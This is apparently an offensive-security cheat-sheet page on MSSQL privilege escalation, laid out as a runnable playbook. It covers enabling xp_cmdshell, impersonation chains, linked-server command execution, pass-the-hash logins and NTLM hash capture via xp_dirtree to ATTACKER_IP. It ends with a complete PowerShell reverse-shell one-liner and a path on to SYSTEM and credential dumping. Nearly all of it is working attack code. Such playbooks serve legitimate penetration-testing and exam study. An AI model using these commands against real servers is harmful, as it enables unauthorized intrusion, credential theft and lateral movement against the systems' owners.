---
id: mssql-privesc
title: MSSQL Privilege Escalation
stage: privesc
tags: [windows, mssql]
summary: Escalate from a SQL login to OS command execution via xp_cmdshell, impersonation chains, or linked server abuse — SQL Server service accounts almost always have SeImpersonatePrivilege.
leads_to:
  - token-impersonation
  - rev-shell
  - system-shell
---

## Prerequisites

A SQL Server login (sa, domain user, or SQL auth). Port 1433 reachable. Connected via impacket-mssqlclient or SSMS. Even a low-privilege login can escalate if impersonation or linked servers are misconfigured.

MSSQL privesc has three distinct paths: (1) enable `xp_cmdshell` if you have sysadmin, (2) impersonate a sysadmin login via `EXECUTE AS LOGIN`, (3) hop across linked servers to reach a sysadmin login on another instance. All three paths lead to OS command execution as the SQL service account, which almost always has `SeImpersonatePrivilege` → GodPotato → SYSTEM.

## Quick Win

> Check impersonation before trying anything else — most exam MSSQL boxes use this path.

```sql
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

## Connect

```bash
impacket-mssqlclient $DOMAIN/$USER:$PASS@$TARGET
impacket-mssqlclient $USER:$PASS@$TARGET -windows-auth
impacket-mssqlclient $USER@$TARGET -hashes :$NTLM -windows-auth
```

## Check Current Privileges

```sql
SELECT SYSTEM_USER;        -- current login
SELECT USER_NAME();        -- current DB user
SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1 = yes
```

## Path 1: Enable xp_cmdshell (if sysadmin)

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Path 2: Impersonation Chain

> If you can impersonate a sysadmin, you become sysadmin.

```sql
-- Impersonate sa or another sysadmin login
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');  -- should return 1
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Path 3: Linked Server Abuse

> Enumerate linked servers — often connect to other MSSQL instances with higher privileges.

```sql
-- List linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Query remote server
SELECT * FROM OPENQUERY("LINKED_SRV", 'SELECT SYSTEM_USER');
SELECT * FROM OPENQUERY("LINKED_SRV", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- Execute on linked server (if sysadmin there)
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;
       EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SRV];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SRV];
```

## NTLM Coercion via xp_dirtree

> Force MSSQL service account to authenticate to your Responder/relay.

```sql
EXEC xp_dirtree '\\ATTACKER_IP\share';
-- Service account NTLMv2 hash captured in Responder
```

## OS Command Execution → Reverse Shell

```sql
EXEC xp_cmdshell 'powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient(\"ATTACKER_IP\",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()"';
```

## Leads To

`whoami` shows service account → check `whoami /priv` → SeImpersonatePrivilege almost guaranteed → token-impersonation → GodPotato → SYSTEM. SYSTEM shell → dump SAM + LSA → pass-the-hash laterally. xp_dirtree hash captured → crack or relay for additional access.
